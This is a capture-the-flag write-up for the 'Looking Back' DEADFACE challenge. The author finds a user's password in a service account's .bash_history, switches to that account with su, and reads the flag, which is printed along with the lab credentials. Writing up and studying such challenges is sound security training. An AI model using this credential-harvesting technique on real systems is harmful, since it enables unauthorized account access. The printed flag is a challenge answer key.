# Looking Back

**Category:** Linux / Forensics / Privilege Escalation  
**Points:** 30  
**Author:** @syyntax  
**Target:** `charon`

## Challenge Description

The challenge provided initial access to the Charon Linux machine as the `svc-deploy` service account.

The objective was to investigate the previous user's activity, gain access to another DEADFACE member's account, and retrieve the flag from their home directory.

## 1. Initial Investigation

After accessing the web-shell, I inspected the shell history of the `svc-deploy` account.

```bash
cat ~/.bash_history
```

### Output

```bash
cd /opt/deploy
cat README.txt
systemctl status charon-collector.service || true
# ticket OPS-4471: rotate member pw after onboarding
echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
history -c
```

The command history revealed an interesting command:

```bash
echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
```

This command indicated that the password for another system user, `deephax`, had previously been changed.

The `chpasswd` utility is used to update Linux user passwords. The command also exposed the username and password in the shell history.

## 2. Accessing Another User Account

Using the discovered credentials, I switched to the `deephax` account.

```bash
su - deephax
```

When prompted, I entered the password found in `.bash_history`.

### Verification

```bash
whoami
pwd
```

Output:

```text
deephax
/home/deephax
```

Successful authentication confirmed access to the target user's account.

## 3. Enumerating the User's Home Directory

Next, I inspected the contents of the `deephax` home directory.

```bash
ls -la
```

### Output

```text
total 20
drwxr-x--- 3 deephax deephax 4096 .
drwxr-xr-x 1 root    root    4096 ..
-rw-r----- 1 deephax deephax   34 flag.txt
drwxr-xr-x 3 deephax deephax 4096 kingmaker-scraper
-rw-r----- 1 deephax deephax  141 notes.txt
```

The listing revealed a `flag.txt` file in the user's home directory.

## 4. Retrieving the Flag

I read the flag using:

```bash
cat ~/flag.txt
```

### Output

```text
deadface{sh3ll_h1st0ry_t3lls_4ll}
```

## Flag

```text
deadface{sh3ll_h1st0ry_t3lls_4ll}
```

## Conclusion

The challenge demonstrated how careless command-line practices can expose sensitive credentials.

By examining the `.bash_history` file belonging to `svc-deploy`, I discovered credentials for the `deephax` account. I then used those credentials to switch users and retrieve the flag from the target user's home directory.

### Key Takeaways

- Linux shell history can expose sensitive information.
- Passwords should never be passed directly in command-line arguments.
- The `chpasswd` utility can modify Linux account passwords.
- The `su` command allows switching between user accounts when valid credentials are available.
- Clearing shell history does not guarantee that sensitive information has been securely erased.

**Status:** Successfully Completed.
